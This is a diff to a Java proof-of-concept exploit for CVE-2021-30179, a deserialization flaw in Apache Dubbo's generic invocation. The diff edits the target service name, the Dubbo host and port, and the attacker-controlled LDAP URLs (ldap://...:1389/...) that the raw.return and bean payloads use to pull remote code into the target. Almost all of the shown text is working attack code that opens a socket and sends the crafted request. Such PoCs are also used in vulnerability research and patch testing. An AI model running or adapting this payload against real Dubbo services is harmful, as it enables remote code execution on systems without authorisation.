@@ -41,7 +41,7 @@ public class CVE_2021_30179 {
         // set body
         out.writeUTF("2.7.6");//dubbo版本
         //todo 此处填写Dubbo提供的服务名
-        out.writeUTF("com.example.api.DemoService");//接口全限定名
+        out.writeUTF("com.pacemrc.dubbo.api.DemoService");//接口全限定名
         out.writeUTF("");//接口版本
         out.writeUTF("$invoke");
         out.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
@@ -50,10 +50,10 @@ public class CVE_2021_30179 {
         out.writeObject(new String[] {"java.lang.String"});//接口方法的参数类型
 
         // POC 1: raw.return
-        getRawReturnPayload(out, "ldap://10.41.230.66:1389/uqsh9k");
+        getRawReturnPayload(out, "ldap://10.58.120.200:1389/nco5cx");
 
         // POC 2: bean
-//        getBeanPayload(out, "ldap://192.168.26.164:1389/amu6em");
+//        getBeanPayload(out, "ldap://10.58.120.200:1389/nco5cx");
 
         // POC 3: nativejava
 //        getNativeJavaPayload(out, System.getProperty("user.dir")+ "\\CVE-2021-30179\\src\\main\\resources\\calc.ser");
@@ -67,7 +67,7 @@ public class CVE_2021_30179 {
         byte[] bytes = byteArrayOutputStream.toByteArray();
 
         //todo 此处填写Dubbo服务地址及端口
-        Socket socket = new Socket("10.41.230.66", 20880);
+        Socket socket = new Socket("10.58.120.200", 20880);
         OutputStream outputStream = socket.getOutputStream();
         outputStream.write(bytes);
         outputStream.flush();
